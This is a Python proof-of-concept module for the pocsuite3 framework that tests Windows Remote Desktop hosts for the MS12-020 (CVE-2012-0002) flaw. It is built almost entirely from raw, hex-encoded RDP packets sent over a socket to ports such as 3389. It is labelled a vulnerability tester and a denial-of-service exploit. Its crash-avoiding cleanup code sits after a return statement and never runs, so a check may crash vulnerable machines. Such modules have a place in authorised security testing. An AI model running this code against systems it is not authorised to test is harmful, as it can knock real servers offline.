#!/usr/bin/env python
# coding: utf-8
import socket
import struct
import sys
from binascii import hexlify, unhexlify
from urllib.parse import urlparse
from pocsuite3.api import register_poc
from pocsuite3.api import Output, POCBase
from pocsuite3.api import POC_CATEGORY, VUL_TYPE


class TestPOC(POCBase):
    vulID = '0'
    version = '1.0'
    author = 'hancool'
    vulDate = '2019-1-9'
    createDate = '2019-1-9'
    updateDate = '2019-1-9'
    references = ['https://gist.github.com/DavidWittman/2312547', ]
    name = 'MS12-020/CVE-2012-0002 Vulnerability Tester'
    appPowerLink = 'https://docs.microsoft.com/en-us/security-updates/securitybulletins/2012/ms12-020'
    appName = 'RDP'
    appVersion = 'All'
    vulType = VUL_TYPE.CODE_EXECUTION
    category = POC_CATEGORY.EXPLOITS.DOS
    desc = '''
    MS12-020/CVE-2012-0002 Vulnerability Tester
    based on sleepya's version @ http://pastebin.com/Ks2PhKb4
    '''

    def _verify(self):
        # reference from https://gist.github.com/DavidWittman/2312547
        def exploit(host, port):
            # See http://msdn.microsoft.com/en-us/library/cc240836%28v=prot.10%29.aspx
            connection_request = unhexlify(''.join([
                "0300",     # TPKT Header version 03, reserved 0
                "0013",     # Length
                "0e",       # X.224 Data TPDU length
                "e0",       # X.224 Type (Connection request)
                "0000",     # dst reference
                "0000",     # src reference
                "00",       # class and options
                "01",       # RDP Negotiation Message
                "00",       # flags
                "0800",     # RDP Negotiation Request Length
                "00000000"  # RDP Negotiation Request
            ]))

            initial_pdu = unhexlify(''.join([
                "03000065",  # TPKT Header
                "02f080",   # Data TPDU, EOT
                "7f655b",   # Connect-Initial
                "040101",   # callingDomainSelector
                "040101",   # calledDomainSelector
                "0101ff",   # upwardFlag
                "3019",     # targetParams + size (25 bytes)
                "020122",  # maxChannelIds
                "020120",  # maxUserIds
                "020100",  # maxTokenIds
                "020101",  # numPriorities
                "020100",  # minThroughput
                "020101",  # maxHeight
                "0202ffff",  # maxMCSPDUSize
                "020102",  # protocolVersion
                "3018",     # minParams + size (24 bytes)
                "020101",  # maxChannelIds
                "020101",  # maxUserIds
                "020101",  # maxTokenIds
                "020101",  # numPriorities
                "020100",  # minThroughput
                "020101",  # maxHeight
                "0201ff",  # maxMCSPDUSize
                "020102",  # protocolVersion
                "3019",     # maxParams + size (25 bytes)
                "0201ff",  # maxChannelIds
                "0201ff",  # maxUserIds
                "0201ff",  # maxTokenIds
                "020101",  # numPriorities
                "020100",  # minThroughput
                "020101",  # maxHeight
                "0202ffff",  # maxMCSPDUSize
                "020102",  # protocolVersion
                "0400",     # userData
            ]))

            user_request = unhexlify(''.join([
                "0300",  # header
                "0008",  # length
                # X.224 Data TPDU (2 bytes: 0xf0 = Data TPDU, 0x80 = EOT)
                "02f080",
                "28",  # PER encoded PDU contents
            ]))

            channel_join_request = unhexlify("0300000c02f08038")
            skt = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            skt.settimeout(10)
            skt.connect((host, port))
            skt.send(connection_request)
            data = skt.recv(8192)
            if data != unhexlify("0300000b06d00000123400") \
                    and data != unhexlify("030000130ed000001234000201080000000000"):
                return (False, "ERROR: This isn't RDP")
                #raise SystemExit(1)
            skt.send(initial_pdu)

            # Send attach user request
            skt.send(user_request)
            data = skt.recv(8192)
            user1 = data[9:11]

            # Send another attach user request
            skt.send(user_request)
            data = skt.recv(8192)
            user2_int = int(hexlify(data[9:11]), base=16)
            user2 = struct.pack('!H', user2_int + 1001)

            # Send channel join request
            skt.send(channel_join_request + user1 + user2)
            data = skt.recv(8192)
            if data[7:9] == b"\x3e\x00":
                """ 0x3e00 indicates a successful join; this service is vulnerable """
                return (True, "This device is vulnerable")
                # Complete request to prevent BSOD
                skt.send(channel_join_request +
                         struct.pack('!H', user2_int) + user2)
                data = skt.recv(8192)
            else:
                # Patched
                return (False, "This device is not vulnerable to MS12-020.")

            skt.close()

        result = {}
        pr = urlparse(self.url)
        if pr.port:  # and pr.port not in ports:
            ports = [pr.port]
        else:
            ports = [3389, 13389, 23389]
        for port in ports:
            try:
                status, msg = exploit(pr.hostname, port)
                if status:
                    result['VerifyInfo'] = {}
                    result['VerifyInfo']['URL'] = '{}:{}'.format(
                        pr.hostname, port)
                    break
            except:
                # raise
                pass

        return self.parse_output(result)

    def _attack(self):
        return self._verify()

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('not vulnerability')
        return output


register_poc(TestPOC)
